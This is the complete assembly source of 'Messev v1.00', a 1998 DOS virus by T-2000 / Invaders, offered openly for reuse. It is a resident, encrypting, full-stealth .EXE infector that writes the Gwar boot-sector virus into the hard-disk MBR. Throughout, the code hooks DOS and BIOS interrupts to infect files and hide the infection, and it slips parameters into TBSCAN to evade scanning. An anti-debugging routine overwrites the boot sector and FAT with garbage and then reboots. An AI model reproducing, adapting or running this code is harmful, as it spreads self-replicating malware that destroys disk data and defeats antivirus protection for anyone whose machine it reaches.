   ;============================================================================
   ;
   ;     NAME: Messev v1.00
   ;     TYPE: Parasitic resident full stealth .EXE-infector.
   ;  PURPOSE: Designed to drop the [Gwar v1.10] bootsector-virus.
   ;     SIZE: Over 2776 bytes.
   ;   AUTHOR: T-2000 / Invaders.
   ;     DATE: March 1998 / May 1998.
   ;
   ;  Capabilities:
   ;
   ;       - Tunneling on INT 13h and INT 21h.
   ;       - Variable encrypting.
   ;       - Full stealth, (SFT-stealth however...).
   ;       - Drops bootsector-virus.
   ;       - Hides bootsectors/MBRs infected with Gwar.
   ;       - Completely invisible for TBSCAN (adds parameters, uses INTs).
   ;       - Anti-tracer: detects tracers (trashes bootsector).
   ;       - Disables stealth on execution archivers (works with PKZIP).
   ;       - Anti-debugging tricks.
   ;
   ;
   ;  PROBLEMS:
   ;
   ;  There are still some things to do, like:
   ;
   ;       - Stealth filereads without SFT's.
   ;       - Determination of system-handles via IOCTL (function 44h). *DONE*
   ;       - Dummy-critical errorhandler.  *DONE*
   ;
   ;  BUGS:
   ;       - DEBUG crashes on exit after port-access.
   ;       - Stack isn't right in carrier.  *FIXED*
   ;       - ARJ exits with a Divide Error. *FIXED*
   ;       - The SBB causes some programs to crash (see above), despite
   ;         that it is correct. (fixed by removal).
   ;       - Invircible terminates with a runtime-error, this is caused
   ;         by hooking function 4301h (set file attributes).
   ;
   ;  Can somebody tell me why the port-access is screwing things up?
   ;  It'sa real pain in mah ass!
   ;
   ;
   ;
   ;
   ; Structure: HOST + PADDING + VIRUS + PADDING + HEADER.
   ;
   ; This virus is dedicated to a very pretty woman who was on Dutch television,
   ; called 'Gallyon van Vessem'.
   ;
   ; Since the stupid AV'ers don't assign a person's name to a virus, this
   ; one is not officially called 'Gallyon'. Instead 'Messev'.
   ;
   ; Stealth-marker is 60 seconds.
   ;
   ; Passes sanity-checks in anti-virus programs.
   ;
   ; When I got ready with Gwar, I've decided build it inside a file-infector,
   ; (nobody boots from a diskette nowadays). At first I thought of a Tai-Pan-
   ; hack, later I decided to write my own. It turned out to be the most stealth
   ; virus I ever programmed.
   ;
   ; Some things were removed to make the virus a little more smaller:
   ;
   ;       - Zero-track hiding.
   ;
   ; Scanner detection:
   ;   - TbScan  :  Only the T-flag (invalid timestamp).
   ;   - F-Prot  :  Possible variant of Desperado (dis is not a hack Goddammit!)
   ;
   ;
   ; Some parts may look a bit messy, this is due optimization.
   ; Also excuse me if there is some bad English in this source.
   ;
   ; My E-Mail: T2000_@HotMail.Com
   ;
   ; To whoever who has dis source: U can do with it whatever U want:
   ;
   ;       - Modify it, (just give me credit)
   ;       - Publish it,
   ;       - Stick it where da sun doesn't shine.
   ;
   ; LAST REMARKS: I hope 2B on #VIRUS very soon!
   ;
   ;============================================================================

           .MODEL  TINY
           .STACK  4096
           .CODE


           ORG     0

   Virus_Size      EQU     OFFSET Virus_End - OFFSET Virus_Begin
   Virus_Mem_Size  EQU     ((Virus_Size * 2) / 16) + (128 / 16)
   Marker_Mem      EQU     921Fh
   Marker_File     EQU     0F0B1h
   Residency_Check EQU     0DCD0h
   Bios            EQU     13h
   Dos             EQU     21h

   Virus_Begin:

   Gwar_Boot:      INCLUDE GWAR.ASM                ; Bootsector-virus.

   Entry:
           CLI                             ; Detect if a tracer is used.
           PUSH    AX
           POP     AX
           DEC     SP
           DEC     SP
           POP     BX
           STI

           CMP     AX, BX                  ; Word correct?
           JE      Not_Traced              ; Then continue execution.


           ; === Our retaliation ===

   Trash_RAM:
           MOV     Trace_Mode, Bios        ; Find BIOS-entrypoint.
           CALL    Tracer

           MOV     AX, 0301h               ; Trash bootsector & part
           MOV     CX, 01h                 ; of FAT with garbage.
           MOV     DX, 0180h               ; (don't hurt our child).
           CALL    BiosInt

           INT     19h                     ; Reboot system.

   Not_Traced:
           MOV     AX, Residency_Check     ; Call residency-check.
           INT     21h

           CMP     AX, Marker_Mem          ; Are we already TSR?
           JNE     Make_Resident

   Exec_Host:
           CALL    Pop_All

           MOV     AX, ES
           ADD     AX, 10h                 ; Plus PSP.

           ADD     CS:Old_Entry+2, AX      ; Add effective segment.
           ADD     AX, CS:Old_Stack+2      ; Plus old SS.

           CLI
           MOV     SS, AX                  ; Restore stack.
           MOV     SP, CS:Old_Stack
           STI

           ;IN      AL, 21h                 ; Unlock keyboard.
           ;AND     AL, NOT 02h
           ;OUT     21h, AL

           XOR     AX, AX                  ; Clear AX.

           JMP     DWORD PTR CS:Old_Entry  ; JMP to host.

   Make_Resident:
           MOV     AH, 62h                 ; Get PSP, (screws some
           INT     21h                     ; debuggers).

           DEC     BX                      ; Get our MCB.
           MOV     DS, BX

           CMP     BYTE PTR DS:[0], 'Z'    ; We want the last MCB.
           JNE     Exec_Host               ; Don't install when not.

           SUB     WORD PTR DS:[03h], Virus_Mem_Size
           SUB     WORD PTR DS:[12h], Virus_Mem_Size
           MOV     ES, DS:[12h]

           PUSH    CS
           POP     DS

           CLD                             ; Copy virus to high-mem.
           XOR     SI, SI
           XOR     DI, DI
           MOV     CX, Virus_Size
           REP     MOVSB

           MOV     AX, OFFSET Relocated2

           PUSH    ES                      ; JMP to relocated virus.
           PUSH    AX
           RETF

           DB      '=[ Messev v1.00, (c) 1998 by T-2000 / Invaders ]='

   Relocated2:
           PUSH    CS
           POP     DS

   ; Status: Bits
   ;
   ;       0  Infect mode.
   ;       1  Filesize stealth mode.
   ;       2  Read-stealth mode.
   ;

           MOV     Status, 00000011b

           MOV     AX, 3000h               ; Get DOS-version (OEM).
           INT     21h

           CMP     BH, 0FFh                ; Microsoft MS-DOS?
           JE      SFT_Supported

           CMP     BH, 0EEh                ; Digital Research DR-DOS?
           JNE     No_SFTs

   SFT_Supported:  OR      Status, 00000100b       ; Read-stealth enabled.

   No_SFTs:
           MOV     AL, Status              ; Save initial status.
           MOV     Init_Status, AL

           MOV     Trace_Mode, Dos         ; Find DOS-entrypoint.
           CALL    Tracer

           MOV     Trace_Mode, Bios        ; Find BIOS-entrypoint.
           CALL    Tracer

           MOV     AL, 13h                 ; Hook INT 13h.
           MOV     BX, OFFSET Stealth_Int13h  ; Stealth-handler for MBR.
           MOV     CX, CS
           CALL    SetInt

           CALL    Gwar_Dropper            ; Install our lil' present.
           NOP                             ; Leave dis here!

           MOV     AL, 21h                 ; Hook INT 21h.
           MOV     BX, OFFSET NewInt21h
           MOV     CX, CS
           CALL    SetInt

           JMP     Exec_Host

   ; See if Gwar is already installed, or else install.
   ; Because we use the tunnelled vector, we can read beyond Gwar's stealth.
   Gwar_Dropper:


   ; Delete port-access driver, so Gwar can infect under Win95. (Same method
   ; as used in Hare virus).

           MOV     AH, 41h                 ; Delete driver.
           MOV     DX, OFFSET Port_Driver
           CALL    DosInt

           MOV     AX, Marker_Mem_Gwar     ; Gwar residency-check.
           INT     13h

           CMP     AX, NOT Marker_Mem_Gwar ; Gwar resident?
           JE      Exit_Installer          ; If so, don't install.

           MOV     AH, 0Dh                 ; Reset harddisk.
           MOV     DL, 80h
           CALL    BiosInt

           POP     BX                      ; POP return address to BX.
           PUSH    BX                      ; PUSH it back.

           MOV     BYTE PTR [BX], 90h      ; Remove breakpoint.

           MOV     AX, 0201h               ; Read MBR of 1st harddisk.
           MOV     BX, OFFSET Buffer
           MOV     CX, 01h
           MOV     DX, 80h
           CALL    BiosInt
           JC      Exit_Installer

           CMP     [BX+Signature], Marker_Boot     ; Already infected?
           JE      Exit_Installer                  ; Then abort drop.

           MOV     AX, 0301h               ; Store original MBR.
           MOV     CX, 02h
           MOV     DX, 80h
           CALL    BiosInt
           JC      Exit_Installer

           MOV     AX, 0301h               ; Write Gwar to MBR.
           MOV     BX, OFFSET Gwar_Boot
           MOV     CX, 01h
           MOV     DX, 80h
           CALL    BiosInt

   Exit_Installer:

           RETN

   Stealth_Int13h:

           CMP     AH, 02h                 ; Read?
           JNE     JMP_Int13h

           OR      DH, DH                  ; Zero-head.
           JNZ     JMP_Int13h

           CMP     CX, 01h                 ; Bootsector?
           JNE     JMP_Int13h

           CALL    BiosInt                 ; Execute function.

           CALL    Push_All
           JC      Exit_Stealth_i13h       ; Exit if error occurred.

           CMP     ES:[BX+Signature], Marker_Boot
           JNE     Exit_Stealth_i13h

           MOV     AX, 0201h               ; Read original bootsector.
           MOV     CX, ES:[BX+Stored_TS]
           MOV     DX, ES:[BX+Stored_HD]
           CALL    BiosInt

   Exit_Stealth_i13h:

           CALL    Pop_All

           RETF    2


   JMP_Int13h:     JMP     DWORD PTR CS:Int13h


           ; <===  S T E A L T H   R O U T I N E S  ===>

   Stealth_Filesize_FCB:

           CALL    DosInt

           CALL    Push_All

           TEST    CS:Status, 00000010b
           JZ      Error_FCB

           OR      AL, AL                  ; Error?
           JNZ     Error_FCB

           MOV     AH, 2Fh                 ; Get DTA-address.
           CALL    DosInt

           CMP     BYTE PTR ES:[BX], 0FFh  ; Extended FCB?
           JNE     Normal_FCB
           ADD     BX, 7                   ; Skip extended stuff.
   Normal_FCB:     MOV     AL, ES:[BX+17h]
           AND     AL, 00011111b           ; Infected stamp?
           CMP     AL, 00011110b
           JNE     Error_FCB

           AND     BYTE PTR ES:[BX+17h], 11100000b

           SUB     WORD PTR ES:[BX+1Dh], (Virus_Size + 16 + 24)
           SBB     WORD PTR ES:[BX+1Fh], 0

   Error_FCB:
           CALL    Pop_All

           RETF    2


   ; Subtract the virussize from infected files' length & clear 60 seconds.
   Stealth_Filesize:

           CALL    DosInt                  ; Execute function.

           CALL    Push_All
           JC      No_Filesize_Stealth     ; Abort when error.

           TEST    CS:Status, 00000010b
           JZ      No_Filesize_Stealth     ; No, then abort.

           MOV     AH, 2Fh                 ; Get DTA-address.
           CALL    DosInt

           MOV     AL, ES:[BX+16h]         ; Get seconds-field.
           AND     AL, 00011111b           ; Mask seconds.

           CMP     AL, 00011110b           ; Equal to 60 seconds?
           JNE     No_Filesize_Stealth     ; No stealth when not.

           AND     BYTE PTR ES:[BX+16h], 11100000b  ; 0 seconds.

           SUB     WORD PTR ES:[BX+1Ah], (Virus_Size + 16 + 24)
           SBB     WORD PTR ES:[BX+1Ch], 0

   No_Filesize_Stealth:

           CALL    Pop_All

           RETF    2                       ; Return 2 caller.


   ; Prevents readings after virtual file & redirect readings from header.
   Stealth_File_Read:

           CALL    Push_All

           MOV     CS:Read_Buffer, DS

           TEST    CS:Status, 00000100b    ; Can we use SFT-stealth?
           JZ      JMP_No_Stealth

           MOV     CS:Read_Bytes, CX       ; Save # of bytes to read.
           MOV     CS:Read_Buffer+2, DX

           CALL    Check_Handle            ; Dis is a filehandle?
           JNZ     JMP_No_Stealth          ; Abort when it isn't.

           CALL    Check_Stamp             ; Infected timestamp?
           JZ      Stealth_Read

   JMP_No_Stealth: JMP     No_Stealth_Read

   Stealth_Read:
           CALL    Get_DCB                 ; Get the SFT-address.

           MOV     AX, ES:[DI+17h]         ; Pos. before read hi.
           MOV     CS:File_Pos, AX
           MOV     AX, ES:[DI+15h]         ; Pos. before read lo.
           MOV     CS:File_Pos+2, AX

           SUB     WORD PTR ES:[DI+11h], (Virus_Size + 16 + 24)
           SBB     WORD PTR ES:[DI+13h], 0
           CALL    Pop_All

           CALL    DosInt                  ; Execute function.

           CALL    Push_All
           JC      Abort_Stealth           ; Abort when error.

           CALL    Get_DCB
           ADD     WORD PTR ES:[DI+11h], (Virus_Size + 16 + 24)
           ADC     WORD PTR ES:[DI+13h], 0

           PUSH    CS
           POP     DS

           CMP     File_Pos, 0             ; Reading 1st 64k?
           JNZ     Abort_Stealth           ; Abort when not.

           CMP     File_Pos+2, 24          ; Reading header?
           JA      Abort_Stealth           ; Abort when not.

           CALL    Save_File_Pos

           CALL    Go_End_File             ; Go to position of old
           SUB     AX, 24                  ; header at end of file.
           SBB     DX, 0

           ADD     AX, File_Pos+2          ; Pos in header.
           ADC     DX, 0

           MOV     ES:[DI+17h], DX         ; Pos. old header.
           MOV     ES:[DI+15h], AX         ; Pos. old header.

           MOV     AH, 3Fh                 ; Read original header
           MOV     CX, 24                  ; into caller's buffer.
           SUB     CX, File_Pos+2
           MOV     DX, Read_Buffer+2
           MOV     DS, Read_Buffer
           CALL    DosInt

           CALL    Restore_File_Pos
   Abort_Stealth:
           CALL    Pop_All

           RETF    2                       ; Return to caller.

   No_Stealth_Read:
           CALL    Pop_All

           JMP     Continue


   ; Prevents lseeks beyond virtual file.
   Stealth_Fileseek:

           CALL    Push_All

           TEST    CS:Status, 00000100b    ; Readstealth?
           JZ      No_Stealth_lseek

           CALL    Check_Stamp             ; Infected stamp?
           JNZ     No_Stealth_Lseek

           CALL    Get_DCB
           SUB     WORD PTR ES:[DI+11h], (Virus_Size + 16 + 24)
           SBB     WORD PTR ES:[DI+13h], 0

           CALL    Pop_All

           CALL    DosInt                  ; Execute function.

           CALL    Push_All

           CALL    Get_DCB
           ADD     WORD PTR ES:[DI+11h], (Virus_Size + 16 + 24)
           ADC     WORD PTR ES:[DI+13h], 0

           CALL    Pop_All

           RETF    2

   No_Stealth_lseek:

           CALL    Pop_All

           JMP     Continue


   ; DS:DX = Filename.
   Clean_By_File:
           CALL    Push_All

           MOV     AX, 3D02h               ; Open file r/w.
           CALL    DosInt
           JC      Abort_Clean

           XCHG    BX, AX

           CALL    Clean_Handle            ; Clean it.

           MOV     AH, 3Eh                 ; Close file.
           CALL    DosInt
   Abort_Clean:
           CALL    Pop_All

           JMP     Continue

   ; Removes the virus physically from disk, before a program writes to it.
   Clean_By_Handle:

           CALL    Clean_Handle

           JMP     Continue

   ; Cleans the handle, (must have read/write access).
   Clean_Handle:
           CALL    Push_All
           CALL    Hook_i24h

           PUSH    CS
           POP     DS

           CALL    Check_Handle            ; Filehandle?
           JNZ     No_Del

           MOV     AX, 5700h               ; Get filedate.
           CALL    DosInt

           MOV     FileTime, CX            ; Save it.
           MOV     FileDate, DX

           AND     CL, 00011111b           ; Mask seconds.
           CMP     CL, 00011110b           ; 60 seconds ?
           JNE     No_Del

           CALL    Save_File_Pos
           CALL    Go_End_File

           SUB     AX, 24
           SBB     DX, 0

           MOV     CX, DX
           XCHG    DX, AX
           MOV     AX, 4200h               ; Pos. old header.
           CALL    DosInt

           MOV     AH, 3Fh                 ; Read old header.
           MOV     CX, 24
           MOV     DX, OFFSET Header
           CALL    DosInt

           CALL    Go_End_File

           SUB     AX, (Virus_Size + 16 + 24)
           SBB     DX, 0

           MOV     CX, DX
           XCHG    DX, AX
           MOV     AX, 4200h               ;
           CALL    DosInt

           MOV     AH, 40h                 ; Write <EOF> marker.
           XOR     CX, CX
           CALL    DosInt

           CALL    Go_Begin_File

           MOV     AH, 40h                 ; Write old header.
           MOV     CX, 24
           MOV     DX, OFFSET Header
           CALL    DosInt

           MOV     AX, 5701h               ; Set clean filedate.
           MOV     CX, FileTime
           MOV     DX, FileDate
           AND     CL, 11100000b           ; Clear seconds.
           CALL    DosInt

           CALL    Restore_File_Pos

   No_Del:         CALL    Unhook_i24h
           CALL    Pop_All

           RETN

   ; Check if timestamp is marked as 'infected'.
   ; BX = Filehandle.
   ; ZF set when infected.
   Check_Stamp:

           PUSH    AX
           PUSH    CX
           PUSH    DX

           MOV     AX, 5700h               ; Get time & datestamp.
           CALL    DosInt

           AND     CL, 00011111b           ; Infected?
           CMP     CL, 00011110b           ; (Set's flags).

           POP     DX
           POP     CX
           POP     AX

           RETN



   ; Hides infected timestamp.
   Stealth_Time:
           CALL    DosInt

           PUSHF
           PUSH    CX

           MOV     CS:Temp, CL

           JC      No_Stealth_Time

           TEST    CS:Status, 00000010b
           JZ      No_Stealth_Time

           CALL    Check_Stamp
           JNZ     No_Stealth_Time

           AND     CS:Temp, 11100000b      ; Zero seconds.

   No_Stealth_Time:

           POP     CX
           POPF

           MOV     CL, CS:Temp

           RETF    2

   Save_File_Pos:

           MOV     AX, 4201h               ; Get file-position.
           XOR     CX, CX
           CWD
           CALL    DosInt

           MOV     CS:Old_Pos, DX
           MOV     CS:Old_Pos+2, AX

           RETN


   Restore_File_Pos:

           MOV     AX, 4200h
           MOV     CX, CS:Old_Pos
           MOV     DX, CS:Old_Pos+2
           CALL    DosInt

           RETN

   Go_Begin_File:
           MOV     AX, 4200h
           XOR     CX, CX
           CWD
           CALL    DosInt

           RETN


   ;-------------------------
   ; Goes to end of file.
   ;
   ;  In:    BX = filehandle
   ; Out: DX:AX = filesize
   ;-------------------------
   Go_End_File:
           MOV     AX, 4202h
           XOR     CX, CX
           CWD
           CALL    DosInt

           RETN

   ; These INT 21h functions will be trapped by our virus. If the subfunction
   ; is 0FFh, it will be treaded like a wildcard.
   Functions:
           DW      11FFh                   ; Findfirst (FCB).
           DW      Stealth_Filesize_FCB
           DW      12FFh                   ; Findnext (FCB).
           DW      Stealth_Filesize_FCB
           DW      4EFFh                   ; Findfirst (handle).
           DW      Stealth_Filesize
           DW      4FFFh                   ; Findnext (handle).
           DW      Stealth_Filesize
           DW      4B00h                   ; Execute file.
           DW      Init_Exec
           DW      4B01h                   ; Load but not execute.
           DW      Clean_By_File
           DW      5700h                   ; Get filetime.
           DW      Stealth_Time
           DW      3CFFh                   ; Create/truncate file.
           DW      Check_Infect
           DW      3DFFh                   ; Open file.
           DW      Check_Infect
           DW      3FFFh                   ; Read file (handle).
           DW      Stealth_File_Read
           DW      40FFh                   ; Write to file (handle).
           DW      Clean_By_Handle
           DW      42FFh                   ; lseek file.
           DW      Stealth_Fileseek
           DW      41FFh                   ; Delete file.
           DW      Check_Infect
           DW      4CFFh                   ; Program terminate.
           DW      Switch_Stealth_On
           DW      6CFFh                   ; Extended open/create.
           DW      Check_Infect
           DW      43FFh                   ; Get file-attributes.
           DW      Check_Infect
           DW      Residency_Check         ; Are-You-There call.
           DW      Return_Call

           DW      0                       ; End table.
   NewInt21h:

           PUSH    SI
           PUSH    BX

           MOV     SI, OFFSET Functions

   Next_Function:
           MOV     BX, CS:[SI]

           OR      BH, BH                  ; End of table reached?
           JZ      End_Table_Reached       ; Then abort.

           CMP     BH, AH                  ; Function match?
           JNE     Another

           CMP     BL, 0FFh                ; Don't compare subfunction?
           JE      Exec_Function           ; Then JMP to routine.

           CMP     BL, AL                  ; Subfunction right?
           JE      Exec_Function           ; Then JMP to routine.

   Another:
           ADD     SI, 4                   ; Next entry.
           JMP     Next_Function           ; Repeat loop.

   End_Table_Reached:

           POP     BX
           POP     SI

   Continue:       JMP     DWORD PTR CS:Int21h

   Exec_Function:
           MOV     BX, CS:[SI+2]
           MOV     CS:Ret_Add, BX

           POP     BX
           POP     SI

           JMP     CS:Ret_Add              ; JMP to routine.


   ; === Let the virus know that we are already installed in memory. ===
   Return_Call:

           MOV     AX, Marker_Mem

           IRET


   Switch_Stealth_On:

           PUSH    AX

           MOV     AL, CS:Init_Status
           MOV     CS:Status, AL

           POP     AX

           JMP     Continue


   Init_Exec:
           CALL    Push_All

           ; Should we be inactive during run of program?
           ; Else causes problems.
           ; ARJ.EXE Timestamp incorrect.
           ; PKZIP.EXE Wrong filesizes, etc.

           MOV     SI, DX
           MOV     DI, OFFSET No_Active
           MOV     CX, (OFFSET End_No_Active - OFFSET No_Active) / 7
           CALL    Search_Table
           JNZ     No_Disable

           AND     CS:Status, 00000000b

   No_Disable:
           MOV     DI, OFFSET TBSCAN       ; Add parameters to TBSCAN?
           MOV     CX, 1
           CALL    Search_Table
           JNZ     Not_TbScan

           MOV     DI, ES:[BX+2]
           MOV     ES, ES:[BX+4]

           MOV     AL, ES:[DI]
           CBW

           ADD     BYTE PTR ES:[DI], 6     ; Length parameters.
           INC     DI
           ADD     DI, AX

           PUSH    CS
           POP     DS

           CLD
           MOV     SI, OFFSET Parameters

           MOVSW
           MOVSW
           MOVSW
           MOVSB

   Not_TbScan:
           CALL    Pop_All


               ; === INFECTION ROUTINE ===
   Check_Infect:
           CALL    Push_All
           CALL    Hook_i24h               ; Dummy error-handler.

           CMP     AH, 6Ch                 ; Extended open/create?
           JNE     No_Ext_Open             ; (used by F-Prot).

           MOV     DX, SI                  ; DX = SI.
   No_Ext_Open:

           TEST    CS:Status, 00000001b    ; Infect-mode on?
           JZ      JMP_Exit_i21h           ; Abort when not.

           MOV     AX, 3D02h               ; Open file for r/w.
           CALL    DosInt
           JNC     No_Open_Error

   JMP_Exit_i21h:  JMP     Exit_Int_21h

           DB      'Daddy-K-tit 2 Gallyon van Vessem'

   No_Open_Error:
           XCHG    BX, AX                  ; BX = Handle.

           CALL    Check_Handle            ; Filehandle?
           JNZ     Abort_Check

           PUSH    CS
           POP     DS

           PUSH    CS
           POP     ES

           MOV     AH, 3Fh                 ; Read header.
           MOV     CX, 24
           MOV     DX, OFFSET Header
           CALL    DosInt
           JC      Abort_Check             ; If we can't read.

           CALL    Go_End_File

           OR      DX, DX                  ; > 64k?
           JNZ     Over_64k

           CMP     AX, 560                 ; File too small?
           JB      Abort_Check
   Over_64k:
           CMP     Mark, 'ZM'              ; .EXE-file?
           JNE     Abort_Check             ; Exit when not.

           CMP     Checksum, Marker_File   ; Already infected?
           JNE     Infect_File

   Abort_Check:
           JMP     Close_File

   Infect_File:
           MOV     AX, 5700h               ; Get filetime.
           CALL    DosInt

           PUSH    CX
           PUSH    DX

           CALL    Go_End_File

           AND     AX, 00001111b           ; Filelength MOD 16.
           MOV     Padding, AX

           OR      AX, AX
           JZ      No_Padding

           MOV     AH, 40h                 ; Write padding bytes.
           MOV     CX, 16
           SUB     CL, AL
           MOV     Padding, CX
           CALL    DosInt
   No_Padding:
           CALL    Go_End_File

           PUSH    DX                      ; Size host + padding.
           PUSH    AX

           CLD                             ; Save old CS:IP.
           MOV     SI, OFFSET Init_IP
           MOV     DI, OFFSET Old_Entry
           MOVSW
           MOVSW

           MOV     AX, Init_SP             ; Save old SS:SP.
           MOV     Old_Stack, AX
           MOV     AX, Init_SS
           MOV     Old_Stack+2, AX

           IN      AL, 40h                 ; Get random encryption-key.
           MOV     File_Key, AL

           CLD                             ; Copy virus to buffer
           XOR     SI, SI                  ; for encryption.
           MOV     DI, OFFSET Buffer
           MOV     CX, Virus_Size
           REP     MOVSB

           MOV     SI, OFFSET Buffer
           MOV     CX, OFFSET End_Encrypted_File

   Encrypt_Byte:
           XOR     BYTE PTR [SI], AL       ; Encrypt ourself in buffer.
           INC     SI
           LOOP    Encrypt_Byte

           MOV     AH, 40h                 ; Append virus to host.
           MOV     CX, (Virus_Size + 16)
           SUB     CX, Padding
           MOV     DX, OFFSET Buffer
           CALL    DosInt

           MOV     AH, 40h                 ; Write original header
           MOV     CX, 24                  ; to end of hostfile.
           MOV     DX, OFFSET Header
           CALL    DosInt

           MOV     AX, HeaderSize          ; Calculate headersize.
           MOV     CX, 16
           MUL     CX

           XCHG    CX, AX

           POP     AX                      ; Length host + padding.
           POP     DX

           SUB     AX, CX                  ; Minus headersize.
           SBB     DX, 0                   ; *** Causes a bug with ARJ
                           ; by small files. > 512.
                           ; Also with Invircible.

           MOV     CX, 16                  ; In paragraphs.
           DIV     CX

           MOV     Init_CS, AX             ; Store new CS.
           MOV     Init_IP, OFFSET START

           DEC     AX                      ; Anti-heuristic.

           MOV     Init_SS, AX
           MOV     Init_SP, (Virus_Mem_Size * 16)

           CALL    Go_End_File

           MOV     CX, 16                  ; Filelength in paragraphs.
           DIV     CX

           ADD     AX, Virus_Mem_Size
           MOV     MinMem, AX

           CALL    Go_End_File

           MOV     CX, 512                 ; 512 byte-pages.
           DIV     CX

           OR      DX, DX                  ; No rest?
           JZ      No_Round                ; Then no round-off.
           INC     AX                      ; Round off.
   No_Round:       MOV     Byte_Pages, AX
           MOV     MOD512, DX

           MOV     Checksum, Marker_File   ; Mark as infected.

           CALL    Go_Begin_File

           MOV     AH, 40h                 ; Write updated header.
           MOV     CX, 24
           MOV     DX, OFFSET Header
           CALL    DosInt

           MOV     AX, 5701h               ; Restore filedate.
           POP     DX
           POP     CX
           AND     CL, 11100000b           ; Clear seconds.
           OR      CL, 00011110b           ; 60 secs.
           CALL    DosInt

   Close_File:     MOV     AH, 3Eh                 ; Close file.
           CALL    DosInt

   Exit_Int_21h:
           CALL    Unhook_i24h
           CALL    Pop_All

           JMP     Continue




       ; Tunnelled disk interrupt 13h.
   BiosInt:
           PUSHF
           CALL    DWORD PTR CS:Int13h

           RETN

       ; === Call the tunnelled DOS-interrupt. ===
   DosInt:
           PUSHF
           CALL    DWORD PTR CS:Int21h

           RETN


   ;====( Get interrupt vector )================================================
   ;
   ;     AL = Interrupt number to hook.
   ;
   ; Return: CX:BX = Pointer to INT.
   ;============================================================================
   GetInt:

           PUSH    SI
           PUSH    DS
           PUSH    AX

           MOV     AH, 4
           MUL     AH

           XCHG    SI, AX

           XOR     AX, AX
           MOV     DS, AX

           CLI                             ; Get handler-address.
           MOV     BX, DS:[SI]
           MOV     CX, DS:[SI+2]
           STI

           POP     AX
           POP     DS
           POP     SI

           RETN

   ;====( Set interrupt vector )================================================
   ;
   ;     AL = Interrupt number to hook.
   ;
   ; Returns:
   ;
   ;  CX:BX = Pointer to handler.
   ;============================================================================
   SetInt:

           PUSH    SI
           PUSH    DS
           PUSH    DX
           PUSH    AX

           MOV     AH, 4
           MUL     AH

           XCHG    SI, AX

           XOR     AX, AX
           MOV     DS, AX

           CLI
           MOV     DS:[SI], BX
           MOV     DS:[SI+2], CX
           STI

           POP     AX
           POP     DX
           POP     DS
           POP     SI

           RETN



   Old_Entry       DW      OFFSET Carrier, 0       ; Entrypoint host.
   Old_Stack       DW      OFFSET Virus_End + 1024, 0                    ; Stacksegment host.



       ; === Finds the original BIOS & DOS entrypoint. ===
   Tracer:
           CALL    Push_All

           MOV     AH, 52h                 ; List of lists.
           INT     21h

           MOV     AX, ES:[BX-02h]         ; Get 1st MCB.
           MOV     Dos_Segment, AX

           MOV     AL, 01h                 ; Save INT 01h.
           CALL    GetInt

           MOV     Int01h, BX
           MOV     Int01h+2, CX

           MOV     AL, 01h                 ; Hook INT 01h.
           MOV     BX, OFFSET NewInt01h
           MOV     CX, CS
           CALL    SetInt

           MOV     AL, Trace_Mode          ; Get address from vector.
           CALL    GetInt

           PUSHF
           POP     AX
           OR      AH, 01h                 ; TF on.
           PUSH    AX
           POPF

           CMP     Trace_Mode, Bios
           JNE     Mode_Dos

           MOV     Int13h, BX
           MOV     Int13h+2, CX

           XOR     AH, AH                  ; Reset disk.
           CALL    BiosInt

           JMP     Exit_Tracer
   Mode_Dos:
           MOV     Int21h, BX
           MOV     Int21h+2, CX

           MOV     AX, 3000h               ; Get DOS-version (OEM).
           CALL    DosInt

   Exit_Tracer:
           PUSHF
           POP     AX
           AND     AH, NOT 01h                 ; TF off (just in case).
           PUSH    AX
           POPF

           MOV     AL, 01h                 ; Restore INT 01h.
           MOV     BX, Int01h
           MOV     CX, Int01h+2
           CALL    SetInt

           CALL    Pop_All

           RETN

   ;       I should be learning 4 my exams right now...

           DB      'If I don''t pass... fuck it!', 0
           DB      'SKLSUX!'

   NewInt01h:
           PUSH    BP
           MOV     BP, SP
           PUSH    AX
           PUSH    DS

           MOV     AX, [BP+4]              ; Segment.

           CMP     Trace_Mode, Bios
           JNE     Trace_Dos

           CMP     AH, 0C0h                ; In BIOS-segment?
           JB      Not_In_Bios             ; Continue when not.

           MOV     Int13h+2, AX
           MOV     AX, [BP+2]
           MOV     Int13h, AX
           JMP     Diss_Flag

   Trace_Dos:
           CMP     AX, Dos_Segment         ; In DOS-segment?
           JNB     Not_In_Bios             ; Continue when not.

           MOV     Int21h+2, AX
           MOV     AX, [BP+2]
           MOV     Int21h, AX

   Diss_Flag:
           AND     BYTE PTR [BP+7], NOT 01h   ; Diss trapflag on stack.

   Not_In_Bios:
           POP     DS
           POP     AX
           POP     BP

           IRET


   ; Taken from Predator virus.
   Push_All:
           POP     CS:[Ret_Add]   ; Pop return address to var.

           PUSHF
           PUSH    AX
           PUSH    BX
           PUSH    CX
           PUSH    DX
           PUSH    SI
           PUSH    DI
           PUSH    DS
           PUSH    ES
           PUSH    BP

           JMP     CS:Ret_Add              ; Push return address on
                           ; the stack.

   Pop_All:
           POP     CS:[Ret_Add]            ; Save return address.

           POP     BP
           POP     ES
           POP     DS
           POP     DI
           POP     SI
           POP     DX
           POP     CX
           POP     BX
           POP     AX
           POPF

           JMP     CS:[Ret_Add]


   ; Gets the SFT-address. *UNDOCUMENTED*
   ; BX = Handle.
   ;
   Get_DCB:
           PUSH    BX

           MOV     AX, 1220h               ; Get DCB-number.
           INT     2Fh

           MOV     AX, 1216h               ; Get DCB-address.
           MOV     BL, ES:[DI]
           INT     2Fh

           POP     BX

           RETN

   TBSCAN          DB      'TBSCAN.'



   ; During execution of one of these programs, the virus will be inactive,
   ; (no stealth, no infect).

   No_Active:
           DB      'PKZIP.E'               ; PKZIP.EXE
           DB      'ARJ.EXE'               ; ARJ.EXE
           DB      'LHA.EXE'               ; LHA.EXE
           DB      'RAR.EXE'               ; RAR.EXE
           DB      'CHKDSK.'               ; CHKDSK.EXE
   End_No_Active:


   Hook_i24h:
           CALL    Push_All

           MOV     AL, 24h                 ; Get INT 24h.
           CALL    GetInt

           MOV     CS:Int24h, BX
           MOV     CS:Int24h+2, CX

           MOV     AL, 24h                 ; Hook INT 24h.
           MOV     BX, OFFSET NewInt24h
           MOV     CX, CS
           CALL    SetInt

           CALL    Pop_All

           RETN

           ; I would really recommend getting this CD
           ; (yes, it's da theme-music from Carmageddon).

           DB      '[ DEMANUFACTURE - FEAR FACTORY ]'

   Unhook_i24h:
           CALL    Push_All

           MOV     AL, 24h                 ; Restore INT 24h.
           MOV     BX, CS:Int24h
           MOV     CX, CS:Int24h+2
           CALL    SetInt

           CALL    Pop_All

           RETN


   ; Dummy Critical Error handler.
   NewInt24h:
           MOV     AL, 03h

           IRET


   ;=======================================================================
